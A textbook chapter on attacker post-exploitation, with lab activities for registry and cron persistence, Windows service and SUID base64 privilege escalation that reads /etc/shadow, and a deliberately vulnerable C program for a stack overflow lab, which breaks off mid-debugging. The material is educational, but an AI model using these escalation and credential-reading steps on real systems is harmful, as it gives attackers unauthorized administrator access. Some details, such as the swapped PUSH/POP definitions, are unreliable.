# Chapter 6 - Persistence and Privilege Escalation
![](endpoint_hacked.jpg)

The previous chapter covered several features of Windows and Linux operating systems that have a security impact.  Some of those features promote security while other features are utilities that could be abused by malicious actors.  In this chapter, we will cover some common threat actor techniques conducted after initial compromise.  This will include how attackers gain further access on an already compromised system and how they maintain their access over time.  The last section of the chapter focuses on application memory issues which can be abused to gain initial access onto a system or increase an attacker's permissions on a compromised system.

**Objectives**
1. Understand the post exploitation activities performed by actors after initial compromise.
2. Demonstrate persistence techniques in Windows and Linux operating systems.
3. Conduct privilege escalation methods within compromised systems.
4. Identify buffer overflow vulnerabilities and craft exploits to hijack an application's execution flow.
## Post Exploitation
An attacker gaining access to a system is only the first milestone of their illicit behavior.  There are several ways in which an attacker gains initial access that will be covered later in this textbook.  One such technique might be a phishing email sent to victim that includes a malware attachment.  An attacker could gain remote access to a system where a victim downloads and runs the phishing email malware.

Once a threat actor gains access into a network or system they usually begin **post exploitation** activities.  These activities are described by the following terms:
1. **Persistence** - Techniques used to maintain attacker access and get back into the system.
2. **Pillage** - Enumeration of a compromised system to gain an understanding of what it is used for, to collect sensitive data, and discover secrets such as passwords.
4. **Privilege Escalation** - The act of increasing a compromised user's permissions or compromising new accounts with more permissions on a system such as administrator.
5. **Pivot** - The initial system that is compromised is used as a launch point to gain access to other systems within the network, or other connected networks.

Each of the listed activities under post exploitation are mutually exclusive and could be performed individually and in any order.  Generally, the order listed above is the order often seen by attackers as there is a progressive nature to the activities.  Regardless, the activities are also iterative where they are re-performed as new information becomes available.  For example, an attacker that achieves initial access may pillage and discover an administrator password and use it to accomplish privilege escalation.  Once their privileges are escalated, the attacker may then re-do their initial pillage activities in an attempt to discover more information about the system under the new privileged context.  In another example, an attacker may wish to re-establish a persistence mechanism once privilege escalation has been achieved, or maybe the persistence technique relies on privilege escalation first being obtained such as when a new user account has to be created.

The following sections focus on persistence and privilege escalation techniques within Linux and Windows operating systems.  In the previous Operating System Security chapter, we covered several operating system features that have material security significance as they could be abused to an attacker's advantage.  You will find that the persistence and privilege escalation techniques covered in detail within this chapter leverage the foundational knowledge of those operating system features previously covered.  We don't cover all such techniques and methods and readers are encouraged to explore the provided resources and experiment in their lab environments.
### Windows Persistence 
Attackers aiming to maintain system access on a Windows system could leverage several native operating system features.  Often the attacker will create a malicious script or executable that will be periodically ran from the victim's device.  This malware will establish a network connection to an attacker control server which will grant them remote access to the victim's machine.  Should the victim restart their device, the malicious persistence mechanism will re-run and re-establish the connection for the attacker to use.  Such malicious programs can be executed using services and startup tasks or other Windows features such as registry startup tasks covered in the previous chapter.

> [!info] Info - Windows Persistence Techniques Resource
> Many other Windows persistence techniques are covered within the InternalAllTheThings GitHub book maintained by swisskyrepo.  https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/windows-persistence/

In some cases, the attacker will have network access to the system over remote management protocols or tools, such as *virtual network computing (VNC)*, *remote desktop protocol (RDP)* or *secure shell (SSH)*.  This could include cloud based solutions as well, such as software provided by AnyDesk, TeamViewer, or GoToMyPC.  If the attacker has the victim's username, password, and network access, they can leverage these tools and protocols to regain access to the system.  However, the attacker might not have the user's password regardless of their initial access exploitation as these attacks might only provide the attacker with a connection as the victim account.  The attacker could reset the user's password, but the next time the user attempts to login they will likely be alerted that their security has been compromised.  To avoid this, an attacker may create a new user account that can be used at any time.  The username for this new malicious account will likely be something that is easily missed by an observer, such as a generic name like "eric" or "desktop-user".  Even craftier usernames that hide the malicious use of the new account might reference a software that is used by the organization or system like "slack-agent" or "discord-service".  Unsuspecting system users may see these accounts and dismiss that they are malicious.  You wouldn't expect the attacker to name the malicious account something obvious like "backdoor-hacker" would you?

> [!activity] Activity 6.1 - Windows Persistence with Registry
> One place an attacker can stash a malicious backdoor binary is within the run tasks of the user's registry.  In lieu of creating a network backdoor executable, which will be covered in a later chapter, I'll use the calculator (`calc.exe`) application as a stand in replacement to a backdoor executable.  As a compromised logged in user, I'll set a new registry key under the Windows startup run tasks pointing to the "malicious" `calc.exe`.  Then upon reboot, I'll log in and witness the calculator app is automatically launched.  A real threat would launch the process in the background as to not alert the victim.
> 
> After powering up the Windows machine and logging in, I open a command prompt and run the following registry command that adds the key `NotEvil` with the regular string value of the path to the `calc.exe` file.
> ```cmd
> reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotEvil /t REG_SZ /d "C:\Windows\System32\calc.exe“
> ```
> ![[win_persistence_reg_command.png|Adding Key to Registry Run|600]]
> The operation completes successfully.  To test it, I reboot the Windows VM and witness the calculator app automatically launches at login!  This simulates re-establishing a connection if a malicious binary was running instead of the harmless calculator app.
> ![[win_persistence_calc_launch.png|Calculator Runs at Login|300]]
> I'll inspect the registry by opening the Registry Editor application as administrator from the Windows search bar and accepting any UAC prompt.  Upon launching, I navigate to the Run key under the current user hive and find the persistence key `NotEvil`.
> 
> ```txt
> Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
> ```
> ![[win_persistence_regedit.png|Registry Editor Run Key with NotEvil]]
> Because I don't want the calculator app to run each time I start this VM, I delete this key by right-clicking it and selecting the Delete button from the context menu.
### Linux Persistence
Attackers can leverage similar persistence techniques as just covered with Windows operating systems.  This includes creating new users and leveraging operating system features such as cron and services.  Even seemingly benign features like the *message of the day (MOTD)*, which displays a banner message upon terminal session creation, can be used to hide malicious code that would be executed at login.  There are many creative places a backdoor can be hidden by an attacker to maintain a foothold on a victim computer.  Knowing what and where these operating system persistence techniques are used assists defenders such as incident responders, threat hunters, and malware analysis professionals.  Host based intrusion detection systems and antimalware solutions should also be tuned to monitor these operating system hiding spots for abnormal activity.

> [!info] Info - Linux Persistence Resource
> Swisskyrepo has also created the "Linux - Persistence" resource within the GitBook "Internal All The Things".  Interested readers should check out this resource and the listed techniques. https://swisskyrepo.github.io/InternalAllTheThings/redteam/persistence/linux-persistence/

>[!activity] Activity 6.2 - Linux Persistence with Cronjob
>Attacker persistence can be accomplished using a cronjob that executes a malicious script on Linux devices.  I'll demonstrate this technique by creating a cronjob on the victim Ubuntu VM user that will run each time the machine is rebooted.  I'll use a harmless command that creates a `cron.txt` file on the user's desktop in lieu of creating a backdoor; however you can imagine this command being replaced with a script that makes a connection back to the attacker.
>
>With the Ubuntu VM started and the `daniel` user logged in, simulating an attacker's initial access, I create a cronjob that applies the date into a text file on the user's desktop upon reboot.  I also list the cron table to confirm the job was applied.
>```bash
>echo "@reboot date > /home/daniel/Desktop/cron.txt " | crontab 2> /dev/null
>crontab -l
>```
>![[linux_persistence_crontab.png|Applying Cronjob Persistence Example|600]]
>Once applied I reboot the VM and login as the user.  Upon login I can see that the cron.txt file was created and now exists on the desktop!  While this document isn't exactly scary, you can imagine if instead a binary or script was ran that reaches back out to the attacker's server and establishes a remote terminal session on the device.
>![[linux_persistence_cron_success.png|Cronjob Executed Creating Text File|300]]
>Because I don't want this file to be created each time I reboot, I remove the cronjob with the following command and delete the cron.txt file.
>```bash
>echo "" | crontab 2> /dev/null
>crontab -l
>```
>![[linux_persistence_removed.png|Cronjob Persistence Removed|600]]

### Windows Privilege Escalation
Another task an attacker seeks to achieve after initial access is to elevate their permissions to an administrator level.  Doing so allows the attacker to have full system access where they can pillage the device's data, disable security solutions, delete logs, and anything else they desire.  Certainly if an attacker is able to compromise an elevated user's password then they would already be running in a privileged user context.  In a previous activity, I demonstrated how to extract NTLM hashes from the SAM database and crack passwords using the John the Ripper tool.  However, accessing the SAM and SYSTEM databases required elevated access which provides a challenge to an attacker with only low privileged user access.  Sometimes a Windows system could have misconfigurations or vulnerabilities that can be leveraged by an attacker to gain access to such areas of the system only administrators have.

> [!story] Story - HiveNightmare
> In 2021, a vulnerability CVE-2021-36934 known as HiveNightmare and SeriousSAM was disclosed by security researchers.  In this vulnerability, the Windows *volume shadow copy service (VSS)* was found to be making copies of sensitive SAM and SYSTEM files with global read access.  If an attacker gained access to the device as a low privileged user, they could dump hashed passwords and attempt offline cracking or perform pass-the-hash attacks.  These files include the local administrator hashed passwords which could easily lead to privilege escalation.

Privilege escalation vulnerabilities can be found within the Windows *kernel*, which is the core of the operating system that interfaces with all connected hardware.  The kernel runs with SYSTEM permissions and all users interface with it during normal use of the operating system.  Vulnerabilities in the kernel can often result in privilege escalation because the kernel expects user interaction and input.  Such vulnerabilities may have exploits created that are accessible on the clear web, such as on GitHub or on ExploitDB.  A quick search on ExploitDB for Windows shows several available exploits including a recent kernel based privilege escalation for Windows 11 22h2. [^1]

![[exploit_db.png|ExploitDB Windows Search]]

Selecting that exploit link provides us with the source code and further references.  Often these exploits will include instructions on how to compile and use them.  Looks like for this exploit we are on our own for figuring out its compilation and use.

![[exploit_db_code.png|Kernel Exploit Code from ExploitDB]]

Actually, all of the exploits from this website are already included on the Kali VM.  They are searchable by using the `searchsploit` command followed by a query term as shown in the following image.

![[exploitdb_searchsploit.png|Searchsploit Windows Query|600]]

After identifying a target exploit using `searchsploit`, you can copy it and use it as needed.  Here we find the same C program demonstrated on the ExploitDB website a few screenshots ago.

![[exploitdb_searchsploit_copy.png|Searchsploit Copy of Kernel Exploit|600]]

> [!info] Info - Windows Privilege Escalations Resource
> There are many kernel privilege escalation exploits but they are not the only method of escalation as there can be misconfigurations on a system as well.  These misconfigurations leave the system vulnerable to privilege escalation and other attack phases.  Another of my favorite security websites is Carlos Polop's Hacktricks book which includes a long list of viable attacks.  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

Consider the running processes on the Windows VM that we previously reviewed.  Some of those processes run in an elevated context, as the SYSTEM account or as our logged in user who is a member of the local administrators group.  If an attacker can hijack any of those running elevated processes then they could execute any command from that process.  We also covered Windows services which launch an executable from an event such as the machine's start up.  Every service that launches will create a process under a user's context configured as part of the service.  A Windows service could be hijacked if it includes an *unquoted service path*.  For example, if the path has a folder writable by an attacker and that folder's name includes spaces such as "Program Files", the attacker can place a malicious binary in a folder with the first word of that two spaced word folder name ("Program").  Due to a quirk on how executables are found by the operating system, Windows will search for the binary in the path first checking the name of the folder with the first word.  Once found, the operating system will execute the malicious binary in the hijacked path.

>[!activity] Activity 6.3 - Windows Service Privilege Escalation
>Another possible misconfiguration using the Windows service is when an administrator grants too many permissions on the service.  I will demonstrate how an administrator can give a custom service permissions to all users to write, modify, and run a service.  A malicious user can then abuse this misconfigured and vulnerable service to escalate their privileges.
>
>From the Windows VM, I start by setting up a vulnerable service simulating a careless administrator.  With a command prompt started as an administrator, I use the `sc` command to create a service named `vulnerable`.  I give this service the binary path to the `SearchIndexer` executable to simulate an existing legitimate service.
>```shell
>sc create vulnerable binPath= "C:\Windows\system32\SearchIndexer.exe /Embedding”
>```
>![[win_privesc_service_create.png|Creating a Windows Service|600]]
>After the service is successfully created, I update its ACL to be world writable using the `sdset` option of the `sc` command.  This setting allows any user to modify the service opening it up to abuse.  The long string that is included within the command can be deciphered using Winhelponline's great article.  [^2]
>```cmd
>sc sdset vulnerable "D:(A;;CCLCSWRPWPDTLOCRRC;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCLCSWLOCRRC;;;WD)(A;;CCLCSWLOCRRC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
>```
>![[win_privesc_permissions.png|Setting Permissions on Vulnerable Service|600]]
>The last component of the vulnerable setup is to have a low privileged user that we will use as the victim an attacker has compromised.  Using the `net` commands, I check my system and see that I still have the `tester` user created from a previous activity.  I also confirm that the `tester` user is not a member of the local administrators group.
>```cmd
>net user
>net localgroup administrators
>```
>![[win_privesc_net_user.png|Confirming Low Privileged User Tester Exists|600]]
>My `daniel` user is a member of the local administrator group but `tester` is not.  I log out of the `daniel` account and then login as the `tester` user.  Then I open a command prompt (non-admin), as the attacker who compromised the `tester` user, and update the vulnerable service with a new command.  This malicious command adds the `tester` user to the local administrators group.
>```cmd
>sc config vulnerable binpath= "net localgroup administrators tester /add"
>```
>![[win_privesc_update_service.png|Updating Vulnerable Service With Malicious Command|600]]
>The service has been updated with my new command.  Once the service is restarted, such as during a reboot, the `tester` user should be made an administrator.  The service can do this because it runs as the SYSTEM and can run any valid command.  If I tried adding the `tester` user to the admin group with just that `net localgroup` command, I would receive a permission denied error.  I can force the service start by running the following command.
>```cmd
>sc start vulnerable
>```
>![[win_privesc_start_service.png|Starting Windows Vulnerable Service|600]]
>Notice the `StartService` failure message?  This is because the command provided as a binary path isn't a valid binary.  But the command should have still run regardless of the failure message.  To confirm, I re-run the `net localgroup` command and see that the `tester` user is now a member of the local administrator group!
>```cmd
>net localgroup administrators
>```
>![[win_privesc_success.png|Tester User Privileges Escalated to Local Admin|600]]
>For sake of clean up, I remove the vulnerable service with the following command.
>```cmd
>sc delete vulnerable
>```
>![[win_privesc_cleanup.png|Removing Vulnerable Service|600]]

### Linux Privilege Escalation
Just like the Windows operating system, Linux has similar privilege escalation techniques that include the exploitation of kernel vulnerabilities, abusing cronjobs (Schedule Tasks in Windows), and abusing misconfigured services.  Linux also has many interesting privilege escalation vectors that Windows doesn't due to the differences between how the systems operate and other features.  Interested readers should visit Carol Polop's HackTricks Linux Privilege Escalation page for additional methods - it is one worth bookmarking and referencing as needed. [^3]

> [!info] Info - Finding Privilege Escalation Paths
> Even though I don't cover privilege escalation enumeration tools within activities in this textbook, they are at least worth an honorable mention.  You can conceive that it would be possible to manually check for privilege escalation vulnerabilities as either a defender or as an attacker.  However, that would be cumbersome and an inefficient use of time especially where such a task can be automated using a tool.  For example, one of the Windows privilege escalation paths covered earlier involved a misconfigured service that allow world writable access to the service's execution path running as SYSTEM.  Instead of manually checking for this misconfiguration, a tool could be used to check all services and report back any issues.  The idea of automated scans checking for privilege escalation vulnerabilities provides security professionals with an opportunity to efficiently find where systems may be vulnerable.  Once identified these vulnerabilities can be abused or fixed depending on who finds them first!
> 
> A great tool for Windows, Linux, and MacOS systems is the PEASS-ng series which can be found on GitHub in the carlospolop repository (https://github.com/carlospolop/PEASS-ng).  I have used this tool many times on engagements as it is both reliable and efficient at finding most privilege escalation paths.

Several demonstrations throughout this book use the `sudo` command to elevate permissions to root.  `Sudo` is configured within the `sudoers` file and requires root level access to modify it.  However, it can often be misconfigured to provide more access than what is needed for a user so administrators may strive to apply the principle of least privilege and configure a user's `sudoers` entry to limit specific executables.  Therefore a configured user would only be able to run a specific command under the privileged user context and greatly limit the opportunity for abuse.  Regardless, depending on the executable, the user or attacker could abuse the command to perform elevated tasks and achieve escalation of privilege.  

In the Operating System Security chapter we examined what SUID executables are and how they work to provide users permissions to run executables as a file's owner.  Similar to the `sudo` abuses to escalate privileges, SUIDs can be abused by an attacker to escalate privileges.  One of my favorite websites that lists `sudo` and SUID privilege escalation abuses is GTFOBins.  It maintains a curated list of many native Linux binaries and known ways they can be abused.  The following image shows how the `base64` command can be used to escalate privileges for SUID and `sudo` if a system is misconfigured. [^4]

![[gtfobins.png|Base64 Page From GTFOBins Website]]


> [!activity] Activity 6.4 - Linux SUID Privilege Escalation
> Let's explore how an administrator may configure `base64` to be run as root through the SUID feature of Linux.  I'll setup a vulnerable copy of the binary and then log in as a low privilege user.  Then I'll abuse the SUID binary to extract privileged content from the shadow file which could then later be used to crack the root user's password.
> 
> I start by logging into the Ubuntu machine with my normal user and opening a terminal.  From that terminal I copy the `base64` binary to the desktop while setting its sticky bit making it SUID capable.  Listing out the file shows that the sticky bit is set for the root owner.
> ```bash
> sudo install -m =xs $(which base64) .
> ls -la base64
> ```
> ![[linux_privesc_base64_copy.png|Creating Vulnerable Base64 Binary|600]]
> The action above simulates a system administrator configuring the binary for elevated use.  Although the `daniel` user is a member of the `sudo` group, I won't use `sudo` to access the restricted shadow file.  For example, attempting to `cat` the shadow file or `base64` encoding it results in a permission denied message.  I use the `which` command to find the original `base64` binary and specify its use when testing the shadow file.
> ```bash
> cat /etc/shadow
> which base64
> /usr/bin/base64 /etc/shadow
> ```
> ![[linux_privesc_denied.png|Permission Denied Accessing Shadow File|600]]
> Now the user can abuse the SUID `base64` binary version that is installed on the desktop by base64 encoding the shadow file and then base64 decoding the encoded output to reveal the contents of the shadow file!
> ```bash
> ./base64 "/etc/shadow" | base64 --decode
> ```
> ![[linux_privesc_base64_abuse.png|Abusing Base64 SUID Revealing Shadow Contents|600]]
> The output to the command above displays the root user's hashed password which can be   brute forced offline and then used to escalate privileges to the root user. 
## Buffer Overflows
Programs, regardless of the operating system, rely on the use of *read access memory (RAM)* to store code and data to be executed by the CPU.  When a program is ran, it loads its code and data into memory where it sits until the CPU is ready to process it.  Lower level programming languages, developed with programming language compliers or interpreters, manage the program's planned memory utilization during development.  When the program is eventually executed, all the prescribed memory space is created.  A program that accepts dynamic inputs will allocate some amount of memory space; however, without proper protections, if the volume of input exceeds the memory space allotted the program will likely crash.  In this section, we will explore the basics of how programs interact with the hardware of the system, tools to observe this behavior, and the security implications caused by program memory mismanagement.
### Basics
While this textbook is not meant to teach the reader low level hardware and software interactions, nor is it meant to teach assembly development, we will cover the basics in an effort to provide a working knowledge at a conceptual level.  Interested readers who are not already familiar with assembly language development and how memory works inside a computer's operations should research more on the matter.
#### Assembly Language
All higher level programs, such as JavaScript, are eventually translated into instruction *machine code* that the CPU can execute.  **Assembly language** is the lowest level language that all higher level languages are built on top of.  Assembly's hexadecimal encoding, known as *shellcode*, is ultimately what is stored onto memory and processed by the CPU.  Assembly is not a feature rich language and excludes many abstractions higher level languages use.  For example, the creation of a raw socket can be quite trivially created in Python with a single line of code whereas this same feat in assembly requires many lines of code excluding the use of functions.  For what assembly is missing in features it makes up for in simplicity.  Only one statement per line is permitted with the a simple syntax of `[label] mnemonic [operands] [;comment]`.  Even though assembly is simple, its processing requires developers to track how the code is processed through lines of code stored in memory stacks, moved to registers, and processed by the CPU.

The mnemonic section of a statement determines the operation of the activity to be performed.  The following non-exhaustive list are common assembly mnemonics and descriptions:

- MOV - Short for "move" which copies data from one location onto another.
- JMP - Or "jump" instructing the internal pointer to go to another memory location.
- CALL - Run a subroutine.
- RET - "Return" the pointer to another memory location.
- POP - Put data onto the memory stack.
- PUSH - Remove data from the memory stack.
- NOP - Meaning "no operation" where the pointer passes over the statement to the next statement

> [!note] Note - Assembly Mnemonic Full List
> Checkout Wikipedia's x86 Instruction Listings for a richer list of mnemonics. https://en.wikipedia.org/wiki/X86_instruction_listings
#### Registers
The CPU stores data, memory addresses, and instructions within its own non-RAM memory space called **registers** or *cache*.  Registers are the closest in proximity to the CPU and therefore fastest memory storage.  All instructions processed by the CPU are managed within these registers in conjunction with RAM memory.  These memory caches are predefined and vary depending on the CPU's architecture.  Regardless of the architecture, all CPUs have registers defined for handling data, addresses, pointers, and general purpose uses.  The following table outlines register names and descriptions for various CPU architectures.

| 64-bit | 32-bit | 16-bit | 8-bit | Description |
| ---- | ---- | ---- | ---- | ---- |
| rax | eax | ax | ah & al | Data from returned functions |
| rcx | ecx | cx | ch & cl | Scratch space |
| rdx | edx | dx | dh & dl | Scratch space |
| rbx | ebx | bx | bh & bl | Scratch space |
| rsp | esp | sp | spl | Stack pointer, top of stack |
| rbp | ebp | bp | bpl | Base pointer, bottom of stack |
| rsi | esi | si | sil | Function arguments (2nd) |
| rdi | edi | di | dil | Function argument (1st) |
| r8 - r15 | r8d - r15d | r8w - r15w | r8b - r15b | Scratch space |
| rip | eip |  |  | Instruction pointer |
Having a firm understanding of these registers are needed in order to debug and analyze how a program interacts with memory.
#### Memory Layout
A system's CPU can only process a small amount of data, or instructions, at a time as it has a limited number of registers.  Therefore, the CPU needs to offload the storage of data onto another fast location.  Systems leverage *random access memory (RAM)*, exactly for this task.  When an executable is run, its code and data are copied from disk and placed into memory where it will be used during runtime.

Programs are initialized into memory within a block space which is separated into the *stack*, *heap*, *data*, and *text* segments.  The following illustration shows the order of the segments with the lowest (first) segment used for text and the highest segment used for the stack segment.  The space between the stack and heap segments can be dynamically adjusted as needed by either segment of the program.

![[buffer_mem_layout.png|Memory Layout Segment Order|150]]

You can think of the block of memory as a empty cup.  Water (data) fills the cup (block) from the bottom to the top.  The stack segment holds data that will be processed by program functions.  Other data used by the program is stored within the heap segment.  Global variables are located in the data segment while all the program's code is within the text segment.  Memory address space is represented as a 4 or 8 byte hexadecimal value in 32-bit or 64-bit architecture systems respectively.  As one byte includes two hexadecimal digits, an example address for a 32-bit system would look something like `0x012A341C`. 

> [!tip] Tip - Working in Memory
> When first learning about how computer memory is organized, I would often confuse a memory address with data residing at that memory location since they are both displayed as hexadecimal within memory.  It is important to understand that both address and the values at those addresses are encoded as hexadecimal.

The stack segment is heavily used and very dynamic as it can change constantly depending on the program.  Program functions, or subroutines, that execute tasks usually require inputs, often called *parameters* or *variables*.  These values can be supplied from system data or as input from the user.  The variable is put onto the stack by the *POP* assembly mnemonic in a last in first out (LIFO) order.  The CPU can then reference this value from the stack using its memory address.  Once the function's execution is complete, and a new function is needed to be setup in the stack, the values are removed using the *PUSH* mnemonic.  The stack is comprised of *stack frames* for each function being executed which is illustrated in the following image.   

![[buffer_stack.png|Stack Frame Topology|150]]

The stack's starting location has an address in memory called the *stack pointer*, at the lowest address space, and is used to reference the stack for execution.  Above the stack pointer is the *buffer* space of the stack frame where variables are store that are used for the function during processing.  The end of the stack frame is represented as the *base pointer* which is used by the CPU to track the stack frame's ending space.  Above (higher address space) the base pointer is the *return address* which is used to notify the running program where to go next after the function's execution is complete.  
### Analysis Tools
A compiled executable file includes binary data that isn't particularly useful to a human in raw form.  If you opened such a file into a text editor you would be presented with mostly random characters from all over the Unicode standard.  Fixed variables are hardcoded values that present themselves in ASCII format.  These variables can be very useful to a security researcher analyzing the program statically, or without running it.  Reviewing a binary file's fixed variables statically could reveal sensitive information such as passwords, keys, or IP addresses.

All programs regardless of the language they were written in require compilation for the operating system to run them.  While there are higher level *interpreted* and scripting languages, such as Python that don't require compilation, they all require the use of a compiled binary to be ran.  Source code, before it is compiled, is very useful to the programmer as it is in a form that is readable and understandable by humans; however, they are not much use to the computer.  So we can think of the *compiler* as the translator of human written code to a format understood by the system.  Compiling is thought of as a one-way translation but there is also a class of tooling called **decompilers** which are used to translate compiled programs back to the source code state.  The output of these tools exclude the original naming conventions for variables and functions and require human interpretation.  Another useful tool type is the **disassembler** which takes a compiled binary and translates it into static assembly language statements.  While tedious, any binary can be loaded into this tool type and analyzed at the assembly level to derive the program's logic without the use of a decompiler.  A popular program for both dissembling and decompiling is the open source tool Ghidra which was original developed and released by the National Security Agency (NSA).

There is another class of tool that is useful for analyzing a program during runtime called a **debugger**.  A program can be loaded into a debugger, or a debugger can be attached to an already running process, and the user can analyze the executing code in the CPU registers and memory space in real time.  Other features include the ability to set breakpoints and edit assembly instructions and data while the program runs.  Two popular Linux debuggers are *The GNU Project Debugger (GDB)* and radare2.  For Windows programs, Immunity Debugger and OllyDbg are highly versatile and commonly used.  All four tools are free to use and extensible with community support and plugins.  We will demonstrate the power of GDB in an upcoming activity.

> [!tip] Tip - Endianness
> Data sitting in memory may be written in a linear or reverse order depending on the type of CPU architecture.  The order of bytes written into memory is known as **Endianness** and requires careful consideration when manually analyzing memory.  *Big Endian* is when data is written from left to right whereas *Little Endian* is when data is written from right to left.  Big and Little Endian can also be described as first in first out (FIFO) or a last in first out (LIFO) respectively.  The following diagram demonstrates how the decimal value "1024" is written as hexadecimal `0x0400` in memory.  Under Big Endian it would appear in memory as `0x0400` whereas using Little Endian format would be written as `0x0004`.
> 
> ![[buffer_endianness.png|Endianness of Decimal 1024|300]]
### Overflow Security
Careful memory management is required as programs can ingest inputs of dynamic size.  Such as in the case of a user supplied input, the size of the value needed in the program may not be known at the time the program is compiled so the programmer must allocate sufficient space on the stack to handle the variable.  If the developer, or compiler, does not properly handle the amount of space to be allocated in memory for the variable, they might introduce memory related bugs or security vulnerabilities.  These vulnerabilities could enable an attacker to hijack the execution flow of the program and cause the program to execute arbitrary code.  The impact of such a vulnerability depends on the context of the running program  For instance, if the program  run as a networked service, an attacker could gain initial access to the system the program is running on.  In another example, if the program is running under a privileged user context, like administrator or root, then the attacker can inject code into the program or cause the program to execute remote code under the privileged user context, known as privilege escalation.

Conscientious programmers will ensure that the buffer memory space is allocated and input boundary or size is validated before values are placed on the stack.  Otherwise, the input could exceed the size of the stack and overwrite other memory space which is known as a **buffer overflow**.  Therefore, an input which is not validated can be crafted that overwrites the index pointer with an address to a section of memory desired by the attacker.  That address can lead to areas in memory that executes code controlled by the attacker.  This includes the attacker storing their own code into memory or leveraging commands already existing in memory and chaining them together into *gadgets*, or chains of dispersed code.

>[!note] Note - Memory Security Issues
>There are many security issues related to the management of memory for a program.  While we cover a *stack based buffer overflow*, there are heap-based overflows, integer overflows, and others.  Interested readers are encouraged to research and explore the depths of this area of security!

A well written program can avoid memory security issues and the vulnerabilities related to them by managing commands that create and modify memory space.  However, there are also security protections a compiled program can leverage with the operating system.  The **data execution prevention (DEP)** setting can be applied at the operating system level to enforce permissions on buffer memory space to be read and write only, preventing execution.  This prevents overflow vulnerabilities to some degree by ensuring any malicious code written to the buffer space can't be executed.  But its protections are limited as it does not prevent the overflow to other areas of existing executable memory which can be used to run malicious code.  

Operating systems also include an **address space layout randomization (ASLR)** security mode that ensures the memory space used by the program is different each time the program runs.  This security setting makes it more difficult for exploit developers to create a malicious payload that targets other code in memory, as they won't know where that malicious code resides because the address space is different every time the program launches.  ASLR can be bypassed using brute force techniques where the address space is found via guess and check.  

The last security measure we'll cover is the **canary** method in which the operating system applies a small random value, a *canary token*, in every stack frame.  The canary token is checked before code in the frame is executed and if it does not match the program won't execute the stack.  However, this protection can also be bypassed through a technique that leverages an overflow vulnerability to collect the canary token value and include it in the final malicious payload.

> [!activity] Activity 6.5 - Stack Smashing the Hidden Function
> I'll demonstrate a Linux binary stack based buffer overflow vulnerability and exploit in the following activity.  First, I'll create a vulnerable program written in C that fails to validate an input.  I'll disable all security settings for the sake of demonstration and compile the vulnerable binary using `gcc`.  Then, I will use GDB and the GDB Enhanced Features (GEF) plugin to analyze the binary, craft an exploit, and cause the program to execute code it was not intended to.
> 
> Using the Kali VM in Bridge Adapter network mode, I start a terminal and install GDB from `apt` after updating.  
> ```bash
>sudo apt update -y
>sudo apt install gdb -y
> ```
> ![[../images/06/activity_bof2_gdb_install.png|Install GDB|650]]
> 
> After the GDB installation is complete, I install GEF using `bash` running the command from a remote repository.  GEF enhances GDB with features and formatting that I personally enjoy over other extensions that are available.
> ```bash
> bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
> ```
> ![[../images/06/activity_bof2_gef_install.png|GEF Installation|650]]
> With GDB and GEF installed, I'll create the vulnerable C program as the file `program.c`.  This very simple program includes two functions called `hidden` and `main`.  The main function creates a buffer space of 100 bytes and uses the `gets` utility to accept user input and renders the input from the `printf` function.  The hidden function simply displays a static message; however, there is no execution path to it from main.  This hidden function should never be run as there is no logic path to it within the program.  I place the following source code into the `program.c` file.  
> ```c
> #include <stdio.h>
> void hidden(){
> 	printf("Congrats, you found me!\n");
> }
> int main(){
> 	char buffer[100];
> 	gets(buffer);
> 	printf("Buffer Content is : %s\n",buffer);
> }
> ```
> ![[buffer_activity_program_source.png|Program Source Code|600]]
> I then compile the code using the GCC compiler with application level security settings disabled into an executable file `program`.  The compiler's output warns us the the gets function is dangerous - we'll ignore that concern and exploit it soon.
> ```bash
> gcc  -no-pie -fno-stack-protector -z execstack program.c -o program
> ```
> ![[buffer_activity_compile.png|Compiling the Vulnerable Program|600]]
> I also want to disable ASLR protections on the operating system with the following command.  This ensures that each time our program runs it will use the same address space.
> ```bash
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```
> ![[buffer_activity_aslr_disable.png|Disabling ASLR Protections|600]]
> When the program is run from the command line it will wait for a user input.  After an input is entered, the program takes the value and places it on the stack.  Then the program retrieves the value and prints it to standard output on the screen.  At no time is the hidden function executed as the static message "Congrats, you found me!" is not displayed.  I run the function using the following command and then enter "lol" as an input.  As expected, it reflects back "Buffer Content is : lol".
> ```bash
> ./program
> lol
> ```
> ![[buffer_activity_baseline_input.png|Running Program With Non-Malicious Input|600]]
> I'll run the program again, but this time I'll supply it with around 150 letter "A"s.  This time the program returns a segmentation fault which means it likely found a return address in memory that it could resolve so the program crashes.  This demonstrates how buffer overflows are identified as a well behaving program would fail gracefully.
> ```
> ./program
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> ```
> ![[buffer_activity_segfault.png|Identifying the Buffer Overflow|600]]
> Now that an overflow vulnerability was detected I can being to explore how to hijack the execution flow of the program using the GDB debugger.  Before I start the application in the dugger, I create an `input.txt` file that has 200 letter "A"s using Python.
> ```bash
> python -c "print('A'*200)" > input.txt
> ```
> ![[buffer_activity_input_test.png|Creating Input File|600]]
> To launch the program into the debugger, I run GDB with the `-q` flag that ignores the onload header and version banner while supplying GDB with the program name.  After GDB launches I am presented with the `gef` command line interface.
> ```bash
> gdb -q ./program
> ```
> ![[../images/06/activity_bof2_gef_start.png|Starting Program in GDB|650]]
> With GDB started I run the program and redirect the input text file with 200 "A"s into the running app.  The program loads with the content of `index.txt` and immediately segmentation faults (segfaults).
> ```bash
> run < input.txt
> ```
> ![[../images/06/activity_bof2_gef_200.png|Running Program in GDB with Input|650]]
> GDB returns the register, code, and stack at the time of the segfault.  The first section of the GDB report shows me all the CPU registers and their values when the program crashed.  The 200 "A"s filled up the buffer and then wrote over the stack and base pointer (RBP/RSP) registers which caused the program to crash.
> ![[../images/06/activity_bof2_gef_registers.png|Initial Crash Registers|650]]
